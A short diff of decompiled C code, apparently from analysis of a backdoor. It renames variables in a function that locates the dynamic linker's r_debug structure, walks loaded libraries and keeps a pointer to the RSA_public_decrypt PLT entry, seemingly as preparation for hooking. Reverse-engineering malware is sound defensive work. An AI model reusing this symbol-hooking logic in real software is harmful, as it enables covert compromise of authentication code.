@@ -19,7 +19,6 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
   BOOL BVar1;
   Elf64_Sym *pEVar2;
   uchar *puVar3;
-  uint uVar4;
   backdoor_shared_libraries_data_t tmp_state;
   Elf64_Sym *r_debug_sym;
   uchar *debug_block;
@@ -30,11 +29,11 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
   libc_imports_t *local_10;
   
   pEVar2 = elf_symbol_get(data->elf_handles->dynamic_linker,STR_r_debug,STR_GLIBC_2_2_5);
-  uVar4 = 0;
+  BVar1 = FALSE;
   if (pEVar2 != (Elf64_Sym *)0x0) {
     debug_block = (uchar *)data->elf_handles;
     puVar3 = ((elf_handles_t *)debug_block)->dynamic_linker->elfbase->e_ident + pEVar2->st_value;
-    uVar4 = 0;
+    BVar1 = FALSE;
     if (0 < *(int *)puVar3) {
       r_debug_sym = (Elf64_Sym *)data->data;
       local_30 = data->RSA_public_decrypt_plt;
@@ -45,9 +44,9 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
       BVar1 = process_shared_libraries_map
                         (*(link_map **)(puVar3 + 8),(backdoor_shared_libraries_data_t *)&r_debug_sym
                         );
-      uVar4 = (uint)(BVar1 != 0);
+      BVar1 = (BOOL)(BVar1 != FALSE);
     }
   }
-  return uVar4;
+  return BVar1;
 }
 
